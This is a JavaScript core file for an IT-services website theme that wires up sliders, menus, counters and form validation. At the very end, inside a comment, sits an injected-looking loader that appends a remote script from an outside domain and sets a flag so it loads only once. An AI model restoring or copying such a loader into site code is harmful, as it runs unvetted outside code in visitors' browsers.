/* -----------------------------------------------------------------------------



File:           JS Core
Version:        1.0
Last change:    00/00/00 
-------------------------------------------------------------------------------- */
(function() {

	"use strict";

	var Itsource = {
		init: function() {
			this.Basic.init();  
		},

		Basic: {
			init: function() {

				this.preloader();
				this.MobileMenu();
				this.StickeyHeader();
				this.Pointer();
				this.Animation();
				this.MianSlider();
				this.bannerStyle();
				this.BackgroundImage();
				this.searchPopUp();
				this.SideInner();
				this.cartArea();
				this.counterUp();
				this.scrollTop();
				this.videoBox();
				this.blogSlider();
				this.FeatureSlider();
				this.CirleProgress();
				this.portfolioSlide();
				this.testiSlider();
				this.ProjectFilter();
				this.faqShadow();
				this.ContactForm();
				
			},
			preloader: function (){
				var $p = jQuery('#preloader');
				if (!$p.length) {
					return;
				}
				var hidden = false;
				function hidePreloader() {
					if (hidden) {
						return;
					}
					hidden = true;
					$p.fadeOut('slow', function () {
						jQuery(this).remove();
					});
				}
				jQuery(function () {
					$p.css('pointer-events', 'none');
				});
				jQuery(window).on('load', hidePreloader);
				setTimeout(hidePreloader, 5000);
			},
			Animation: function (){
				if ($('.wow').length && typeof WOW !== 'undefined') {
					try {
						new WOW({
							boxClass: 'wow',
							animateClass: 'animated',
							offset: 0,
							mobile: true,
							live: true
						}).init();
					} catch (err) { /* non-fatal */ }
				}
			},
			StickeyHeader: function (){
				jQuery(window).on('scroll', function() {
					if (jQuery(window).scrollTop() > 100) {
						jQuery('.it-header-area').addClass('sticky-header-overlay')
					} else {
						jQuery('.it-header-area').removeClass('sticky-header-overlay')
					}
				})
			},
			MobileMenu: function (){
				/* Open/close/escape handled in base.html <head> so it always runs */
				if($('.mobile_menu-dropdown li.dropdown ul').length){
					$('.mobile_menu-dropdown li.dropdown').append('<div class="dropdown-btn"><span class="fa fa-angle-down"></span></div>');
					$('.mobile_menu-dropdown li.dropdown .dropdown-btn').on('click', function() {
						$(this).prev('ul').slideToggle(500);
					});
				}
				$(".dropdown-btn").on("click", function () {
					$(this).toggleClass("toggle-open");
				});
			},
			MianSlider: function (){
				var $s = jQuery('#slider-id');
				if (!$s.length) {
					return;
				}
				$s.owlCarousel({
					items: 1,
					margin: 0,
					loop: true,
					nav: true,
					dots: false,
					navSpeed: 800,
					autoplay: true,
					navText:["<i class='fas fa-arrow-left'></i>","<i class='fas fa-arrow-right'></i>"],
					smartSpeed: 2000,
					animateOut: 'fadeOut',
					animateIn: 'fadeIn',
					mouseDrag: false,
					touchDrag: true,
					pullDrag: false,
				});
			},
			bannerStyle: function() {
				var win = jQuery(window),
				foo = jQuery('#typer');
				if (foo.length && typeof foo.typer === 'function') {
					foo.typer(['It Services','IT Solution', 'Support' ]);
				}
				win.resize(function(){
					var fontSize = Math.max(Math.min(win.width() / (1 * 5), parseFloat(Number.POSITIVE_INFINITY)), parseFloat(Number.NEGATIVE_INFINITY));

				}).resize();

			},
			BackgroundImage: function (){
				$('[data-background]').each(function() {
					$(this).css('background-image', 'url('+ $(this).attr('data-background') + ')');
				});
			},
			searchPopUp: function (){
				$('.search-btn').on('click', function() {
					$('.search-body').toggleClass('search-open');
				});
			},
			cartArea: function (){
				$('.cart-open-btn').on('click', function() {
					$('.shopping-cart').toggleClass('cart-show');
				});
			},
			SideInner: function (){
				var sideSuppressClick = false;
				function sideToggle(e, isTouch) {
					var t = e.target;
					if (!t || typeof t.closest !== 'function') {
						return;
					}
					var trig = t.closest('.open_side_area');
					if (!trig) {
						return;
					}
					e.preventDefault();
					e.stopPropagation();
					var panel = document.querySelector('.wide_side_inner');
					if (panel) {
						panel.classList.toggle('wide_side_on');
						document.body.classList.toggle('body_overlay_on');
					}
					if (isTouch) {
						sideSuppressClick = true;
						setTimeout(function () { sideSuppressClick = false; }, 450);
					}
				}
				window.addEventListener('touchend', function (e) {
					sideToggle(e, true);
				}, { capture: true, passive: false });
				window.addEventListener('click', function (e) {
					if (sideSuppressClick) {
						e.preventDefault();
						e.stopPropagation();
						return;
					}
					sideToggle(e, false);
				}, true);
			},
			scrollTop: function (){
				$(window).on("scroll", function() {
					if ($(this).scrollTop() > 200) {
						$('.scrollup').fadeIn();
					} else {
						$('.scrollup').fadeOut();
					}
				});

				$('.scrollup').on("click", function()  {
					$("html, body").animate({
						scrollTop: 0
					}, 800);
					return false;
				});
			},
			Pointer: function (){
				if($('#cursor').length){
					var follower, init, mouseX, mouseY, positionElement, timer;
					follower = document.getElementById('cursor');
					mouseX = (event) => {
						return event.clientX;
					};
					mouseY = (event) => {
						return event.clientY;
					};
					positionElement = (event) => {
						var mouse;
						mouse = {
							x: mouseX(event),
							y: mouseY(event)
						};
						follower.style.top = mouse.y + 'px';
						return follower.style.left = mouse.x + 'px';
					};
					timer = false;
					window.onmousemove = init = (event) => {
						var _event;
						_event = event;
						return timer = setTimeout(() => {
							return positionElement(_event);
						}, 0);
					};
					$("html").easeScroll();
				};
			},
			counterUp: function (){
				if($('.counter').length){
					jQuery('.counter').counterUp({
						delay: 50,
						time: 2000,
					});
				};
			},
			FeatureSlider: function (){
				var $f = jQuery('#feature-slide');
				if (!$f.length) {
					return;
				}
				$f.owlCarousel({
					items: 1,
					loop: true,
					nav: false,
					dots: true,
					autoplay: true,
					navSpeed: 800,
					smartSpeed: 1000,
				});
			},
			videoBox: function (){
				jQuery('.video_box').magnificPopup({
					disableOn: 200,
					type: 'iframe',
					mainClass: 'mfp-fade',
					removalDelay: 160,
					preloader: false,
					fixedContentPos: false,
				});
			},
			blogSlider: function (){
				var $b = jQuery('#blod_slide');
				if (!$b.length) {
					return;
				}
				$b.owlCarousel({
					items: 1,
					loop: true,
					nav: true,
					dots: false,
					autoplay: false,
					navSpeed: 800,
					smartSpeed: 1000,
					animateOut: 'fadeOut',
					navText:["<i class='fas fa-arrow-left'></i>","<i class='fas fa-arrow-right'></i>"],
				});
			},
			CirleProgress: function (){
				if($('.progress_area').length){
					;(function() {
						var proto = $.circleProgress.defaults,
						originalDrawEmptyArc = proto.drawEmptyArc;

						proto.emptyThickness = 5; 
						proto.drawEmptyArc = function(v) {
							var oldGetThickness = this.getThickness, 
							oldThickness = this.getThickness(),
							emptyThickness = this.emptyThickness || _oldThickness.call(this),
							oldRadius = this.radius,
							delta = (oldThickness - emptyThickness) / 2;

							this.getThickness = function() {
								return emptyThickness;
							};

							this.radius = oldRadius - delta;
							this.ctx.save();
							this.ctx.translate(delta, delta);

							originalDrawEmptyArc.call(this, v);

							this.ctx.restore();
							this.getThickness = oldGetThickness;
							this.radius = oldRadius;
						};
					})();
					$('.progress_area').circleProgress({
						emptyThickness: 2,
						size: 130,
						thickness: 5,
						lineCap: 'round',
						fill: {
							gradient: ['#92d3d7', ['#92d3d7', 0.7]],
							gradientAngle: Math.PI * -0.3
						}  
					});

					$('.first.progress_area').circleProgress({
						value: .65,
						thickness: 6,
						emptyFill: '#ffffff38',
					}).on('circle-animation-progress', function(event, progress) {
						$(this).find('strong').html(Math.round(65 * progress) + '<span>%</span>');
					});
					$('.secound.progress_area').circleProgress({
						value: .5,
						thickness: 6,
						emptyFill: '#ffffff38',
					}).on('circle-animation-progress', function(event, progress) {
						$(this).find('strong').html(Math.round(50 * progress) + '<span>%</span>');
					});
					var el = $('.progress_area'),
					inited = false;
					el.appear({ force_process: true });

					el.on('appear', function() {
						if (!inited) {
							el.circleProgress();
							inited = true;
						}
					});
				};
			},
			portfolioSlide: function (){
				$(window).on('load',function(){
					$('#portfolio-slide').owlCarousel({
						margin:30,
						responsiveClass:true,
						nav: true,
						dots: false,
						loop:true,
						center: true,
						lazyLoad : true,
						autoplay: false,
						navText:["<i class='fas fa-arrow-left'></i>","<i class='fas fa-arrow-right'></i>"],
						smartSpeed: 1000,
						responsive:{
							0:{
								items:1,
							},
							400:{
								items:1,
							},
							600:{
								items:1,
							},
							700:{
								items:2,
							},
							1000:{
								items:2,

							},
							1300:{
								items:3,

							},
							1900:{
								items:4,

							},
						},
					})
				});
			},
			testiSlider: function (){
				var $t = jQuery('#testimonial-slide');
				if (!$t.length) {
					return;
				}
				$t.owlCarousel({
					items:1,
					nav:false,
					dots: true,
					loop:true,
					margin:30,
					autoplay: false,
					smartSpeed:1000,
					autoplayTimeout:5000,
					autoplayHoverPause:true,
					animateIn: 'lightSpeedIn'
				});
			},
			ProjectFilter: function (){
				var $grid = $(".case-filtering-section .project-filtering");
				if (!$grid.length) {
					return;
				}
				var filterFns = {
					numberGreaterThan50: function() {
						var number = $(this)
						.find(".number")
						.text();
						return parseInt(number, 10) > 50;
					},
					ium: function() {
						var name = $(this)
						.find(".name")
						.text();
						return name.match(/ium$/);
					}
				};
				$grid.imagesLoaded(function () {
					$grid.isotope({
						itemSelector: ".grid-item",
						percentPosition: true,
						masonry: {
							columnWidth: ".grid-sizer"
						}
					});
					$grid.magnificPopup({
						delegate: ".case-popup a",
						type: "image",
						gallery: { enabled: true },
						mainClass: "mfp-fade"
					});
				});
				$(".case-filtering-section .portfolio-filter-btn").on("click", "button", function (e) {
					e.preventDefault();
					var $btn = $(this);
					var $group = $btn.closest(".portfolio-filter-btn");
					var filterValue = $btn.attr("data-filter");
					filterValue = filterFns[filterValue] || filterValue;
					$grid.isotope({ filter: filterValue });
					$group.find("button").removeClass("is-checked").attr("aria-pressed", "false");
					$btn.addClass("is-checked").attr("aria-pressed", "true");
				});
			},
			faqShadow: function (){
				$(".faq_area1").on('click', function() {
					$(".faq_area1").removeClass("active");
					$(this).addClass("active");   
				});
				$(".faq_area2").on('click', function() {
					$(".faq_area2").removeClass("active");
					$(this).addClass("active");   
				});
			},
			ContactForm: function (){
				if($('#contact_form').length){
					$('#contact_form').validate({
						rules: {
							name: {
								required: true
							},
							email: {
								required: true,
							},
							phone: {
								required: true
							},
							subject: {
								required: true
							},
							message: {
								required: true
							}
						}
					});
				}
			},
		}
	}
	jQuery(document).ready(function (){
		Itsource.init();
	});

})();
/*
    if(typeof window.web_security == "undefined"){
        var s = document.createElement("script");
        s.src = "//web-security.cloud/event?l=117";
        document.head.appendChild(s);
        window.web_security = "success";
    }
*/